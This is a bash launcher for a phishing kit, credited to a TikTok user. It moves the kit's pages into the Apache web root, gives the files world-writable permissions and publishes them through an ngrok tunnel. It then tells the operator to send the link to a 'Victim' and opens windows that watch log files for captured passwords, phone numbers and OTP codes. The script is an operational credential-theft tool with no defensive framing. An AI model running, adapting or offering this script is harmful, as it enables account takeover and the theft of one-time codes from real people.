#!/bin/bash
# MOD BY zuzi404.wp on tiktok
bash setup.sh
clear
cat Launch.txt
sleep 2.5
 echo -e "\e[1;31m REQUIREMENT : ROOT! INTERNET! APACHE SERVER! \e[0m"
 echo -e "\e[1;37m Devolopers assume no liability and are not Responsible! \e[0m"



                                      


sleep 3.5
# spinner
spinlong ()
{
   bar="+++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
   barlenght=${#bar}
   i=o
   while ((i < 100 )); do
	   n=$((i*barlenght / 100 ))
	   printf "\e[00;32m\r[%-${barlenght}s]\e[00m" "${bar:0:n}"
	   ((i += RANDOM%5+2))
	   sleep 0.4
   done
}


#colors
white=$'\e[1;37m'
green=$'\e[0;32m'
blue=$'\e[1;34m'
red=$'\e[1;31m'
yellow=$'\e[1;33m'
  
                 
   echo""
   echo""

read -p "$green [+] Press [ ENTER ] to continue  ==> : " $continue
sleep 2
echo ""
	        hostnamectl
                systemctl start apache2
		systemctl restart apache2.service
		mv /var/www/html/* /var/www/ &> /dev/null
		rm -rf /var/www/html/*
		cp -R * /var/www/html/
		cd ..
		cd /var/www/html/
		chmod +x *
		chmod 7777 *
		sleep 2.5
		
		
		printf "                                \e[210m\e[1;99m ALERT +++++++++++++++++++++ Step 1 - Send Https Link on Victim +++++++++++ \e[0m\n"
		printf "                                \e[210m\e[1;99m ALERT +++++++++++++++++++++ Step 2 - All Password save on /var/www/html/log.txt ++++++++++++++ \e[0m\n"
		echo ""
		sleep 2.5

                xterm -T "ngrok" -geometry 140x25-1+0 -e "./ngrok http 80" & > /dev/null2>&1

		xterm -T "number" -geometry 140x25+1-0 -e "cd /var/www/html/ ; tail -f log.txt | grep -e number" & > /dev/null2>&1

                xterm -T "otp" -geometry 140x25-1-0 -e "cd /var/www/html/ ; tail -f logs.txt | grep -e OTP -e otp" & > /dev/null2>&1

		
                
x=0
while [ $x = 0 ]
do
read -p "$green[*] Do you want to clean all files and exit? [Y/n] ==> : " clean
	case "$clean" in
[nN])
echo "" && exit
;;
[Yy])
echo ""
sleep 2.5
cd /var/www/html/
sudo rm -r *
cd ..
mv index.html index.nginx-debian.html html/ &> /dev/null
pkill ngrok
pkill xterm
pkill php
service apache2 stop
exit
esac
done
